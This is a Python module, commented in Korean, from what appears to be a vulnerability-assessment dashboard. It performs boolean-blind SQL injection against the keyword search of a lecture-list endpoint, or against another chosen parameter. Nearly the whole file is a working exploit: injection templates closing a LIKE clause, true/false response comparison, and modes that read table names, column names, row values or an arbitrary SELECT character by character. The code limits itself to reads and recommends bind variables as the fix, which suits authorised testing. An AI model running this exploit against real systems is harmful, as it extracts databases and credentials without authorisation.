"""강의 목록 검색창 SQL 주입 — 테이블부터 훑어 내려가며 값을 읽는다.

대상: GET /backend/lectures?keyword=   (로그인 없이 열려 있음)
원인: LectureRepository.appendFilters 가 keyword 를 문자열로 이어 붙인다.
      요청마다 개수 쿼리와 목록 쿼리가 따로 돌아서 UNION 은 쓸 수 없고,
      '참이면 몇 건, 거짓이면 몇 건' 차이로 한 글자씩 읽는 방식만 된다.

계산은 dashboard/blind.py 가 하고, 여기서는 '어디에 어떻게 넣을지'만 정한다.
한 번 읽은 값은 기억해 두고 다시 묻지 않는다.

읽기(SELECT)만 보낸다 — DB 는 팀이 함께 쓰는 한 벌뿐이다.
"""
import json
from urllib.parse import quote

from dashboard.blind import Oracle
from dashboard.core import Finding, ToolResult, fetch, run_cache
from dashboard.payloads import DBMS, DBMS_OPTIONS, POINT_PARAMS, ensure_select_only, picked, with_value

META = {
    "id": "sesacedu_lecture_sqli",
    "name": "강의 목록 SQL 주입 (심화)",
    "category": "SQL 주입",
    "kisa": ["SI"],  # 주요정보통신기반시설 웹 항목(dashboard/standards.py)
    # 노션 '웹 서비스 취약점 목록' 의 취약점 유형 — 검색어가 질의문으로 섞여 들어가 참·거짓으로 DB 를 읽는 것
    "vuln": "SQL",
    "kind": "active",
    "roles": ["user_web", "practice"],  # 이 역할의 대상에서만 보인다
    "stage": "tool",
    "takes_point": True,  # 팝업에서 SQL 주입 점검으로 취약이 나온 지점을 고르면 그 자리에 때린다(11-20)
    "severity": "critical",
    # 로그인 없이 네트워크에서, DB 내용이 읽힌다(쓰기·중단은 아님)
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "attack": [
        {"tactic": "TA0009", "technique": "T1005", "name": "Data from Local System"},
        {"tactic": "TA0006", "technique": "T1552", "name": "Unsecured Credentials"},
    ],
    "description": "**심화** — SQL 주입 점검에서 취약으로 나온 **지점을 고르면 그 자리에**, 안 고르면 강의 목록 검색(keyword)에 때립니다. "
                   "테이블 목록부터 컬럼·값까지 눌러 들어가며 읽습니다. 참·거짓 차이로 한 글자씩 읽어서 느립니다.",
    "params": [
        {"name": "mode", "need": "required", "label": "무엇을 볼지", "type": "select", "default": "probe",
         "options": [
             {"value": "probe", "label": "① 주입되는지 확인 (요청 2번)"},
             {"value": "tables", "label": "② 테이블 목록"},
             {"value": "columns", "label": "③ 고른 테이블의 컬럼"},
             {"value": "rows", "label": "④ 고른 컬럼의 값"},
             {"value": "sql", "label": "⑤ 직접 쓴 SELECT 하나"},
         ]},
        {"name": "table", "need": "conditional", "when": "'③ 컬럼 이름' · '④ 값 꺼내기' 를 고를 때만 씁니다", "label": "테이블 (③④)", "default": ""},
        {"name": "column", "need": "conditional", "when": "'④ 값 꺼내기' 를 고를 때만 씁니다", "label": "컬럼 (④)", "default": ""},
        {"name": "sql", "need": "conditional", "when": "'⑤ 직접 적기' 를 고를 때만 씁니다", "label": "SELECT 문 (⑤)", "default": "",
         "help": "값 하나를 돌려주는 SELECT 만 됩니다."},
        {"name": "dbms", "need": "required", "label": "DB 제품", "type": "select", "default": "oracle", "options": DBMS_OPTIONS},
        {"name": "limit", "need": "optional", "label": "한 번에 몇 개", "type": "int", "default": "5",
         "help": "한 글자마다 요청이 여러 번 나갑니다. 5개면 대략 300~500번."},
        {"name": "offset", "need": "optional", "label": "앞에서 건너뛸 개수", "type": "int", "default": "0"},
        {"name": "context", "need": "optional", "label": "값이 들어가는 자리", "type": "select", "default": "like",
         "options": [{"value": "like", "label": "LIKE 검색 ('%…%' — 강의 목록 검색)"},
                     {"value": "string", "label": "문자열 ('…')"},
                     {"value": "number", "label": "숫자"}],
         "help": "지점을 골랐을 때 씁니다. SQL 주입 점검 근거의 '② 기본 · 문자열/숫자 자리' 를 보고 고릅니다."},
        *POINT_PARAMS,
    ],
}

API = "/backend/lectures"
# 검색어 자리는 LIKE '%...%' 안이다. 앞의 따옴표를 닫아 조건으로 만들고,
# 서버가 뒤에 붙이는 %' 를 마지막 따옴표의 짝으로 쓰면 문장이 깨지지 않는다.
KEYWORD = "%' OR ({cond}) AND 'a' LIKE 'a"


CONTEXT = {"like": KEYWORD, "string": "{v}' AND ({cond}) AND 'q'='q", "number": "{v} AND ({cond})"}


def _where(target, params):
    """(설명, 조건 → 보낼 주소) — 고른 지점이 있으면 그 자리, 없으면 강의 목록 검색."""
    pt = picked(params)
    if not pt:
        return f"{target.url}{API} (query: keyword)", \
            lambda cond: f"{target.url}{API}?size=1&keyword={quote(KEYWORD.format(cond=cond), safe='')}"
    url, name, _place, sample = pt
    tpl = CONTEXT.get(params.get("context") or "like", KEYWORD)
    return f"{url} (query: {name})", \
        lambda cond: with_value(url, name, quote(tpl.format(cond=cond, v=sample or "a"), safe=""))


def _count_with(target, params=None):
    """조건을 실어 보내고 '답' 을 돌려주는 함수. 강의 목록은 건수, 다른 지점은 응답의 (상태, 길이)."""
    _desc, make = _where(target, params or {})

    def count(cond):
        r = fetch(make(cond))
        try:
            return json.loads(r.body)["page"]["total"]
        except Exception:  # noqa: BLE001 — 건수가 없는 지점은 응답 모양으로 가른다
            if not r.status:
                raise RuntimeError("응답을 받지 못했습니다")
            return (r.status, len(r.body))
    return count


def _near(c, yes, no):
    """응답 모양(상태, 길이)이 참·거짓 중 어느 쪽에 가까운지. 상태가 같은 쪽 중 길이가 가까운 쪽."""
    def gap(x):
        return (x[0] != c[0], abs(x[1] - c[1]))
    return gap(yes) <= gap(no)


def _open(target, dbms, params=None):
    """참·거짓 기준을 재고 질문 통로를 연다."""
    count = _count_with(target, params)
    yes, no = count("1=1"), count("1=0")
    if yes == no:
        raise RuntimeError(f"참·거짓 답이 {yes}로 같습니다. 주입이 막혔거나 자리가 다릅니다('값이 들어가는 자리' 를 바꿔 보세요).")

    def ask(cond):
        c = count(cond)
        if c == yes:
            return True
        if c == no:
            return False
        if isinstance(c, tuple) and isinstance(yes, tuple):
            return _near(c, yes, no)
        raise RuntimeError(f"예상 밖 답 {c} (조건: {cond[:60]})")

    return Oracle(ask, dbms=dbms, cache=run_cache())


def _page(ora, summary, columns, rows, drills, offset, limit, more):
    """다음 쪽 단추와 요청 수를 붙여 마무리한다."""
    asked = f"요청 {ora.asked}번" + (f" · 기억해 둔 값 {ora.cached_hits}개" if ora.cached_hits else "")
    return ToolResult(
        summary=f"{summary} · {asked}", columns=columns, rows=rows, drills=drills,
        more={**more, "offset": str(offset + limit)} if more and len(rows) == limit else {},
        note="읽기(SELECT)만 보냅니다. 값을 바꾸는 문장은 보내기 전에 막습니다.")


def run(target, params):
    mode = params.get("mode", "probe")
    dbms = params.get("dbms", "oracle")
    sql = DBMS[dbms]
    table = (params.get("table") or "").strip()
    column = (params.get("column") or "").strip()
    limit = max(1, int(params.get("limit") or 5))
    offset = max(0, int(params.get("offset") or 0))
    base = {"dbms": dbms, "limit": str(limit)}

    where, _make = _where(target, params)
    if mode == "probe":
        count = _count_with(target, params)
        yes, no = count("1=1"), count("1=0")
        ok = yes != no
        return ToolResult(
            summary=("주입됩니다 — 참·거짓 답이 다릅니다" if ok else "주입되지 않습니다 — 답이 같습니다") + f" · {where}",
            columns=["보낸 조건", "답(건수 또는 상태·길이)"], rows=[["1=1 (참)", yes], ["1=0 (거짓)", no]],
            drills=[{"테이블 목록 보기": {**base, "mode": "tables", "offset": "0"}}, None] if ok else [],
            findings=[Finding(
                title="강의 목록 검색어에 SQL 주입" if not picked(params) else f"SQL 주입 — {where}",
                severity="critical",
                location=where,
                evidence=f"참 조건(1=1) → {yes}\n거짓 조건(1=0) → {no}\n"
                         "조건의 참·거짓에 따라 답이 달라집니다.",
                recommendation="검색어를 문자열로 잇지 말고 바인드 변수(PreparedStatement)로 넘깁니다. "
                               "정렬 기준은 허용 목록에서 고릅니다.")] if ok else [],
            note="요청 2번만 보냅니다. 여기서 확인된 뒤에 ②부터 읽어 나가세요.")

    # 요청을 보내기 전에 먼저 걸러 낸다
    statement = ensure_select_only((params.get("sql") or "").strip() or "SELECT 1") if mode == "sql" else ""

    ora = _open(target, dbms, params)

    if mode == "tables":
        names = ora.read_list(sql["tables"], limit, offset, charset="ident")
        return _page(ora, f"테이블 {len(names)}개" + (f" (건너뜀 {offset})" if offset else ""),
                     ["테이블"], [[n] for n in names],
                     [{"컬럼 보기": {**base, "mode": "columns", "table": n, "offset": "0"}} for n in names],
                     offset, limit, {**base, "mode": "tables"})

    if mode == "columns":
        if not table:
            raise ValueError("테이블 이름을 넣어 주세요 (② 목록에서 눌러 와도 됩니다)")
        names = ora.read_list(sql["columns"].format(table=table.upper()), limit, offset, charset="ident")
        total = ora.read_number(sql["count"].format(table=table))
        return _page(ora, f"{table} — 컬럼 {len(names)}개 · 전체 {total}행",
                     ["컬럼"], [[n] for n in names],
                     [{"값 보기": {**base, "mode": "rows", "table": table, "column": n, "offset": "0"}} for n in names],
                     offset, limit, {**base, "mode": "columns", "table": table})

    if mode == "rows":
        if not (table and column):
            raise ValueError("테이블과 컬럼을 모두 넣어 주세요")
        cells = []
        for i in range(offset + 1, offset + limit + 1):
            value = ora.read_text(sql["cell"].format(col=column, table=table, n=i, n0=i - 1), charset="text")
            if value is None:
                break
            cells.append(value)
        return _page(ora, f"{table}.{column} — 값 {len(cells)}개" + (f" (건너뜀 {offset})" if offset else ""),
                     ["#", column], [[offset + i + 1, c] for i, c in enumerate(cells)], [],
                     offset, limit, {**base, "mode": "rows", "table": table, "column": column})

    if mode == "sql":
        value = ora.read_text(statement, charset="text")
        return _page(ora, "값 1개", ["SELECT", "값"], [[statement, value]], [], 0, 1, {})

    raise ValueError(f"모르는 모드: {mode}")
